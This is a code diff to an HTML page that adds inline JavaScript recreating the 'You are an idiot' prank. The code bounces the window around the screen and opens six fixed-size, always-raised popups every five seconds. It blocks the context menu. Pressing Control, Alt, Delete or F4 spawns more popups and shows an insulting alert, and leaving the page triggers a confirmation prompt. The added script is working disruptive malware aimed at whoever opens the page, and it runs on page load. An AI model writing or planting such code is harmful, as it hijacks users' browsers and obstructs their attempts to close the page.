@@ -754,8 +754,84 @@
 			<source src="media/youare.mp3" type="audio/mp3">
 		</audio>
 
-		<script src="scripts/math.js" type="application/javascript"></script>
-		<script src="scripts/lol.js" type="application/javascript"></script>
-	<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"b1963cbbb18749fbb0190e26780384b3","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+		<script>
+			window.onload = playBall;
+			setInterval(() => {
+				proCreate(6);
+			}, 5000);
+			window.oncontextmenu = () => false;
+			window.onkeydown = async () => {
+				if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
+					await proCreate(3);
+
+					alert("You are an idiot!");
+					proCreate(6);
+				}
+
+				return null;
+			}
+			window.onbeforeunload = () => "Are you an idiot?";
+			/* [Aug 2023] End of amendments. */
+			let xOff = 5;
+			let yOff = 5;
+			let xPos = 400;
+			let yPos = -100;
+
+			function randomRange(min, max) {
+				min = Math.ceil(min);
+				max = Math.floor(max);
+			
+				return Math.floor(Math.random() * (max - min + 1) + min);
+			}
+
+			function changeTitle(title) {
+				document.title = title;
+			}
+
+			function openWindow(url) {
+				window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+			}
+
+			async function proCreate(count) {	
+				for (let i = 0; i < count; i++) {
+					openWindow('lol.html');
+					await new Promise(r => setTimeout(r, 50));
+				}
+			}
+
+			function newXlt() {
+				xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+				window.focus();
+			}
+
+			function newXrt() {
+				xOff = Math.ceil(7 * Math.random())  * 5 - 10;
+				window.focus();
+			}
+
+			function newYup() {
+				yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+				window.focus();
+			}
+
+			function newYdn() {
+				yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
+				window.focus();
+			}
+
+			function playBall() {
+				xPos += xOff;
+				yPos += yOff;
+				
+				if (xPos > screen.width - 357) newXlt();    
+				if (xPos < 0) newXrt();
+				
+				if (yPos > screen.height - 330) newYup(); 		
+				if (yPos < 0) newYdn();
+
+				window.moveTo(xPos, yPos);
+				setTimeout(playBall, 1);
+			}
+		</script>
 </body>
 </html>
